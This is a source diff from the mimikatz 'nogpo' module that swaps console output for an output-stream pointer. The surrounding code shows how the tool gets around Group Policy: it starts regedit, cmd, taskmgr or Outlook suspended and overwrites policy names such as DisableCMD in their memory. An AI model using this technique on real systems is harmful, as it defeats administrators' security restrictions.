@@ -17,19 +17,19 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_nogpo::getMimiKatzComman
 
 bool mod_mimikatz_nogpo::regedit(vector<wstring> * arguments)
 {
-	wcout << L"Editeur de registre : " << (disableSimple(L"regedit.exe", L"DisableRegistryTools", L"KiwiAndRegistryTools") ? "OK" : "KO") << endl;
+	(*outputStream) << L"Editeur de registre : " << (disableSimple(L"regedit.exe", L"DisableRegistryTools", L"KiwiAndRegistryTools") ? "OK" : "KO") << endl;
 	return true;
 }
 
 bool mod_mimikatz_nogpo::cmd(vector<wstring> * arguments)
 {
-	wcout << L"Invite de commande : " << (disableSimple(L"cmd.exe", L"DisableCMD", L"KiwiAndCMD") ? "OK" : "KO") << endl;
+	(*outputStream) << L"Invite de commande : " << (disableSimple(L"cmd.exe", L"DisableCMD", L"KiwiAndCMD") ? "OK" : "KO") << endl;
 	return true;
 }
 
 bool mod_mimikatz_nogpo::taskmgr(vector<wstring> * arguments)
 {
-	wcout << L"Gestionnaire de taches : " << (disableSimple(L"taskmgr.exe", L"DisableTaskMgr", L"KiwiAndTaskMgr") ? "OK" : "KO") << endl;
+	(*outputStream) << L"Gestionnaire de taches : " << (disableSimple(L"taskmgr.exe", L"DisableTaskMgr", L"KiwiAndTaskMgr") ? "OK" : "KO") << endl;
 	return true;
 }
 
@@ -45,12 +45,12 @@ bool mod_mimikatz_nogpo::olpst(vector<wstring> * arguments)
 		DWORD pidOutlook = 0;
 		bool reussite = disableSimple(pathToOutlook, szDisable, szKiwi, &pidOutlook);
 		
-		wcout << L"Outlook avec PST   : " << (reussite ? L"OK" : L"KO");
+		(*outputStream) << L"Outlook avec PST   : " << (reussite ? L"OK" : L"KO");
 		if(reussite)
 		{
 			mod_patch::patchModuleOfPID(pidOutlook, L"olmapi32.dll", reinterpret_cast<BYTE *>(szDisable), sizeof(szDisable), reinterpret_cast<BYTE *>(szKiwi), sizeof(szKiwi));
 		}
-	} else wcout << L"Outlook introuvable" << endl;
+	} else (*outputStream) << L"Outlook introuvable" << endl;
 	return true;
 }
 
@@ -112,18 +112,18 @@ bool mod_mimikatz_nogpo::getApplicationPathFromCLSID(wstring application, wstrin
 								if(reussite = (regError == ERROR_SUCCESS))
 								{
 									path->assign(reinterpret_cast<wchar_t *>(monPath));
-								} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+								} else (*outputStream) << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 								delete[] monPath;
-							} else wcout << "Le type retourné par \'" << monPath <<  "\' n\'est pas : REG_SZ" << endl;
-						} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+							} else (*outputStream) << "Le type retourné par \'" << monPath <<  "\' n\'est pas : REG_SZ" << endl;
+						} else (*outputStream) << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 						RegCloseKey(hApplicationPath);
-					} else wcout << "RegOpenKeyEx \'" << regPathToPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
-				} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+					} else (*outputStream) << "RegOpenKeyEx \'" << regPathToPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+				} else (*outputStream) << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 				delete[] monGUID;
-			} else wcout << "Le type retourné par \'" << monGUID <<  "\' n\'est pas : REG_SZ" << endl;
-		} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+			} else (*outputStream) << "Le type retourné par \'" << monGUID <<  "\' n\'est pas : REG_SZ" << endl;
+		} else (*outputStream) << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 		RegCloseKey(hApplication);
-	} else wcout << "RegOpenKeyEx \'" << pathToApplication <<  "\' : " << mod_system::getWinError(false, regError) << endl;
+	} else (*outputStream) << "RegOpenKeyEx \'" << pathToApplication <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 
 	return reussite;
 }
@@ -145,17 +145,17 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, SIZE_T taillePattern
 			{
 				if(!(reussite = mod_memory::writeMemory(patternAddr, maCleFinale, taillePattern, mesInfos->hProcess)))
 				{
-					wcout << L"mod_memory::writeMemory " << mod_system::getWinError() << endl;
+					(*outputStream) << L"mod_memory::writeMemory " << mod_system::getWinError() << endl;
 				}
 			}
-			else wcout << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;
 		}
-		else wcout << L"mod_process::getPeb " << mod_system::getWinError() << endl;
+		else (*outputStream) << L"mod_process::getPeb " << mod_system::getWinError() << endl;
 
 		delete monPeb;
 
 		if(!(ResumeThread(mesInfos->hThread) != -1))
-			wcout << L"ResumeThread " << mod_system::getWinError() << endl;
+			(*outputStream) << L"ResumeThread " << mod_system::getWinError() << endl;
 
 		if(monPID)
 		{
@@ -167,7 +167,7 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, SIZE_T taillePattern
 		CloseHandle(mesInfos->hThread);
 		CloseHandle(mesInfos->hProcess);
 	}
-	else wcout << L"mod_process::execProcess " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_process::execProcess " << mod_system::getWinError() << endl;
 
 	delete mesInfos;
 
@@ -186,7 +186,7 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, wstring origKey, wst
 
 		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
 	}
-	else wcout << L"mod_mimikatz_nogpo::disableSimple (unicode) Taille du pattern original différente du pattern cible" << endl;
+	else (*outputStream) << L"mod_mimikatz_nogpo::disableSimple (unicode) Taille du pattern original différente du pattern cible" << endl;
 
 	return reussite;
 }
@@ -203,7 +203,7 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, string origKey, stri
 
 		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
 	}
-	else wcout << L"mod_mimikatz_nogpo::disableSimple (non-unicode) Taille du pattern original différente du pattern cible" << endl;
+	else (*outputStream) << L"mod_mimikatz_nogpo::disableSimple (non-unicode) Taille du pattern original différente du pattern cible" << endl;
 
 	return reussite;
 }
